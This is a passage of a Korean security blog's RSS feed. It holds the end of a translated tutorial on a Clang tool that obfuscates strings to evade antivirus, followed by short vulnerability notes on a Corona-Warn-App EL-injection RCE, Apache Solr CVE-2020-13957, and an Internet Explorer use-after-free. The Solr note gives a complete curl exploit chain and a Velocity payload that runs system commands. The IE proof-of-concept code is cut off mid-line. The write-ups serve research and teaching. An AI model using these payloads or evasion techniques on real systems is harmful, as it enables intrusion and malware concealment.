class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>에서 <code>MatchHandler</code>의 생성자와 <code>run</code> 콜백 함수를 구현해야 한다. <code>MatchHandler</code>의 생성자는 나중에 사용할 <code>clang::Rewriter</code>의 instance만 저장하면 되므로 간단하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>의 구현은 아래와 같다:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>위에서 짚고 넘어갈 세 가지가 있다:</p><ul><li><code>StringEncryptionConsumer</code>에서 정의된 패턴과 일치하는 AST 노드를 추출한다. 그러기 위해서 바인딩된 패턴 identifier를 인자로 문자열을 예상하는 <code>getNodeAs</code>를 호출할 수 있다.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>분석 중인 translation unit에서 정의되지 않은 문자열은 넘어간다. 실제 우리가 만든 pass는 시스템 헤더를 translation unit에 복사하는 <em>Clang</em>의 전처리기 이후에 실행된다.</li><li>이제 문자열 리터럴을 처리할 준비가 됐다. 문자열 리터럴이 어떤 context에서 발견됐는지 알아야 하므로 사용자 정의 함수에서 추출된 노드(위의 경우 <code>climbParentsIgnoreCase</code>)를 AST에 대한 참조를 포함한 <code>Result.Context</code>를 통해 전달한다. 목표는 흥미로운 노드를 찾을 때까지 위쪽의 트리를 탐색하는 것이다. 이 경우에서 흥미로운 노드는 <code>CallExpr</code> 타입이다.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>간단히 말해서 이 함수는 흥미로운 것(“Cast”가 아닌 것)을 찾을 때 까지 <code>StringLiteral</code> 노드의 부모 노드들을 재귀적으로 탐색한다. <code>handleStringInContext</code>는 복잡하지 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>위 코드에서 눈에 띄는 건 실제로 처리되는 노드가 두 종류인 것이다. 또한 필요할 때 추가하는 게 쉬워야 한다. 실제로 두 경우 이미 비슷하게 처리되고 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="문자열-리터럴-교체"><a href="#문자열-리터럴-교체" class="headerlink" title="문자열 리터럴 교체"></a>문자열 리터럴 교체</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>과 <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>은 비슷하게 처리되므로 둘 다 사용할 수 있는 공통적인 함수를 정의한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>변수명을 무작위로 생성한다.</li><li>가까운 위치에서 빈 공간을 찾고 변수 선언을 삽입해라. 이것은 기본적으로 <code>ASTRewriter→InsertText()</code>를 둘러싼 wrapper이다.</li><li>1단계에서 생성된 identifier를 가진 문자열을 바꾼다.</li><li>collection에 문자열 리터럴의 위치를 추가한다. 이는 <code>InitListExpr</code>를 지날 때 같은 문자열 리터럴을 두 번 표시해주므로 유용하다.(이유는 알 수 없다).</li></ul><p>마지막 단계는 실제 구현이 어렵기 때문에 먼저 보자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);&#125;</code></pre><p>보통 텍스트 교체는 <code>ReplaceText</code> API를 쓰지만 많은 버그가 발생했다. 매크로의 경우 Clang의 API는 불규칙하게 동작하여 복잡하다. 예를 들어 <code>isMacroBodyExpansion()</code>을 통한 확인이 없으면 인자가 아니라 <code>&quot;TEXT&quot;</code>가 교체된다. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>에서<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>로 잘못 교체되는 것이다.</p><p>이유는 <code>&quot;TEXT&quot;</code>가 <em>Clang</em>의 전처리기에 의해 처리될 때 <code>L&quot;ntdll&quot;</code>을 교체하는 매크로이기 때문이다. transformation pass는 전처리기 작업이 완료된 후 발생하므로 <code>&quot;ntdll&quot;</code>의 시작과 끝 위치를 쿼리 하는 것은 몇 글자가 빠진 잘못된 값이 나올 수 있어서 유용하지 않다. 불행하게도 기존 translation unit에 실제 위치를 쿼리하는 것은 Clang API를 이용하였고 시행착오를 거쳐서 해결 방법을 찾았다.</p><h3 id="인접한-빈-공간에-변수-선언-삽입"><a href="#인접한-빈-공간에-변수-선언-삽입" class="headerlink" title="인접한 빈 공간에 변수 선언 삽입"></a>인접한 빈 공간에 변수 선언 삽입</h3><p>이제 문자열 리터럴을 변수 identifier로 바꿀 수 있으니 변수를 정의하고 원래 문자열로 할당해야 한다. 패치된 소스 코드에 아무것도 덮어쓰지 않고 <code>char your_variable[] = &quot;ntdll&quot;</code>을 해야 한다.</p><p>두 가지 시나리오가 있다:</p><ul><li>문자열 리터럴이 함수 바디 안에 위치한다.</li><li>문자열 리터럴이 함수 바디 밖에 위치한다.</li></ul><p>후자는 문자열 리터럴이 사용되는 표현식의 시작 부분을 찾으면 돼서 가장 간단하다.</p><p>전자는 포함된 함수를 찾아야 한다. 그 후 Clang은 API로 함수 바디의 시작 위치를 쿼리 한다. 변수가 전체 함수에서 볼 수 있고 우리가 삽입한 토큰이 내용을 덮어 씌우지 않으므로 변수 선언을 삽입할 공간으로 이상적이다.</p><p>어떤 경우든 두 가지 상황은 <code>FunctionDecl</code> 혹은 <code>VarDecl</code> 타입의 노드가 발견될 때까지 모든 부모 노드를 방문해서 해결한다.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>보다시피 잘 동작한다. 지금 이 예제는 정규식으로 해결할 만큼 코드가 짧다. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>지금은 obfuscation pass의 이름이 <code>StringEncryptor</code>이지만 실제로 문자열이 암호화되지 않는다. 문자열을 암호화하려면 얼마나 많은 노력이 필요할까?</p><h3 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…"></a>To be continued…</h3><p>문자열을 난독화하는 것은 쉬운 부분이지만 Clang API에 익숙해야 한다. 소스 코드 문서를 보는데 1~2주 정도 쓰는 것을 추천한다.</p><p>다음 파트에서는 자동으로 API import를 숨기는 것에 대해 다룰 것이다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/evasion/">evasion</category>
      
      <category domain="https://hackyboiz.github.io/tags/meterpreter/">meterpreter</category>
      
      <category domain="https://hackyboiz.github.io/tags/opfuscation/">opfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/22/idioth/av_evasion_part1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] German Corona-Warn-App sever RCE</title>
      <link>https://hackyboiz.github.io/2020/11/21/fabu1ous/2020-11-21/</link>
      <guid>https://hackyboiz.github.io/2020/11/21/fabu1ous/2020-11-21/</guid>
      <pubDate>Sat, 21 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/research/securing-the-figh</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(이하 CWA)은 독일의 접촉자 기록/추적 인프라입니다. 이 앱이 설치된 스마트폰은 블루투스로 식별 payload를 브로드케스트하고, 블루투스의 신호 범위 내에 들어온 다른 디바이스들이 이 payload와 payload를 받은 시각을 2주간 저장합니다. 양성 판정을 받은 사용자는 검사 결과와 이에 대한 키값(Diagnosis key)을 CWA server에 전송할 수 있습니다.</p><p>CWA 서버는 Spring boot 프레임워크로 동작하며 Diagnosis key를 받아 처리하는 과정에서 <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> 취약점이 존재합니다. </p><p>Spring boot app이 입력받은 객체를 validate 한다는 것은 그 객체가 constraint 조건에 만족하는지 확인하는 동작을 뜻합니다. constraint 조건은 ‘@’를 통해 사용합니다.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>int형 num의 최솟값이 1, 최댓값이 10인 constraint 조건이 걸려있는 코드입니다. <code>@Min()</code>이나 <code>@Max()</code>처럼 built-in 조건만 있는 것이 아니라 custom constraint 또한 존재하고, 이를 이용한 validation을 custom constraint validation이라 부릅니다.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation 동작 중 함수<code>buildConstraintViolationWithTemplate()</code>는 메세지 템플릿을 에러 메세지로 변환시켜줍니다. 메세지 템플릿에 <code>$&#123;&#125;</code>를 통해 Expression Language를 삽입할 수 있으며 그 실행결과가 에러 메세지에 반영됩니다. 만약 이 메세지 템플릿의 내용을 해커가 접근할 수 있다면 RCE 취약점입니다.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA 서버는 <code>buildConstraintViolationWithTemplate()</code>을 호출하며 그 인자인 message는 사용자 입력값(Diagnosis key 속 데이터)이기 때문에 RCE 공격에 취약합니다. 사용자 입력을 sanitizing 하도록 패치되었지만, bypass가 가능하다는 평이 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/covid19/">covid19</category>
      
      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
      
      <category domain="https://hackyboiz.github.io/tags/germany/">germany</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/21/fabu1ous/2020-11-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
      <link>https://hackyboiz.github.io/2020/11/20/l0ch/2020-11-20/</link>
      <guid>https://hackyboiz.github.io/2020/11/20/l0ch/2020-11-20/</guid>
      <pubDate>Fri, 20 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-1395</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2020-13957">CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Apache Solr 6.6.0-6.6.5<br>Apache Solr 7.0.0-7.7.3<br>Apache Solr 8.0.0-8.6.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Solr는 Apache Lucene을 기반으로 만들어진 검색 엔진입니다. 사용자는 특정 형식의 XML 파일을 서버에 업로드하여 인덱스를 생성하거나 검색 요청을 하여 결과를 XML 형식으로 얻을 수 있습니다.</p><p>이러한 Solr의 ConfigSet API 에 unauthrization config upload 가 가능해 RCE까지 이어질 수 있는 취약점이 발견되었습니다.</p><p>사용자는 ConfigSet API를 사용해 configset을 업로드하고 logical index를 구성하는 컬렉션을 생성할 수 있습니다. 이 때 원격 코드 실행에 악용될 수 있는 일부 기능들을 필터링해 악성 컬렉션이 구성되는 것을 방지합니다. 그러나 <code>configset.upload.enabled</code> 옵션이 true로 설정되어 있으면 이를 UPLOAD 와 CREATE 로 우회할 수 있습니다.</p><ol><li><p>먼저 악성 configset을 포함하는 압축 파일을 UPLOAD 합니다. </p> <pre><code class="hljs jsx">curl -X POST --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span>--data-binary@<span class="hljs-number">7.</span>zip <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=UPLOAD&amp;name=file1&quot;</span></code></pre></li><li><p>CREATE는 기존 configset을 기반으로 새로운 configset을 작성할 수 있습니다. 이를 이용해 UPLOAD된 configset을 기반으로 새로운 configset을 만들면 악용 가능한 기능들을 필터링을 하지 않아 인증 검사 로직을 우회할 수 있습니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/configs?action=CREATE&amp;name=file3&amp;baseConfigSet=file1&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true&quot;</span></code></pre></li><li><p>2에서 얻은 새로운 configset를 기반으로 악성 컬렉션을 생성합니다.</p> <pre><code class="hljs jsx">curl <span class="hljs-string">&quot;http://[host]/solr/admin/collections?action=CREATE&amp;numShards=1&amp;name=file2&amp;collection.configName=file3&quot;</span></code></pre></li><li><p>생성된 악성 컬렉션은 원격 코드 실행에 사용할 수 있습니다.</p> <pre><code class="hljs jsx">http:<span class="hljs-comment">//[host]/solr/newCollection3/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=&#x27;&#x27;)+%23set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span></code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.secpulse.com/archives/144081.html">https://www.secpulse.com/archives/144081.html</a></p><p><a href="https://issues.apache.org/jira/browse/SOLR-14925">https://issues.apache.org/jira/browse/SOLR-14925</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/apache-solr/">apache solr</category>
      
      <category domain="https://hackyboiz.github.io/tags/unauthrization-upload/">unauthrization upload</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/20/l0ch/2020-11-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17053: Internet Explorer UAF 취약점</title>
      <link>https://hackyboiz.github.io/2020/11/19/idioth/2020-11-19/</link>
      <guid>https://hackyboiz.github.io/2020/11/19/idioth/2020-11-19/</guid>
      <pubDate>Thu, 19 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/20/k/cve-2020-1</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer에서 neutering ArrayBuffer로 인한 use after free 취약점이 발견되었습니다. 해당 취약점은 CVE-2020-1380과 비슷한 취약점이지만 JIT 엔진 없이 트리거할 수 있습니다.</p><p>JIT 엔진을 사용하지 않고 item을 TypedArray로 변환할 때 <em>jscript.dll</em>은 interpreter에서 다음과 같은 작업을 수행합니다.</p><ol><li><code>Js::JavascriptConversion::ToNumber()</code> 호출</li><li>TypedArray의 ArrayBuffer가 detach 되었는지 확인</li><li>변환할 element의 index와 TypedArray의 길이 비교</li><li><code>Js::JavascriptConversion::ToNumber()</code>를 다시 호출하여 ArrayBuffer로 값 설정</li></ol><p><code>Js::JavascriptConversion::ToNumber()</code>의 첫 번째 호출에서 해커는 callback 함수를 통해 TypedArray의 ArrayBuffer를 free 할 수 있고 uaf를 발생시킬 수 있습니다. 이것을 막기 위해 첫 번째 호출 후 ArrayBuffer가 detach 되었는지 확인하여 user code callback에서 메모리가 free 되는 것을 방지합니다. 하지만 두 번째 호출에서는 별다른 검사를 하지 않기 때문에 이를 악용하여 uaf를 발생시킬 수 있습니다.</p><details><summary>POC Code</summary><p><pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);<span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;    arr[index] = value;&#125;<span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;        worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;        worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);        worker.terminate();        worker = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();        <span class="hljs-keyword">while</span> (<span 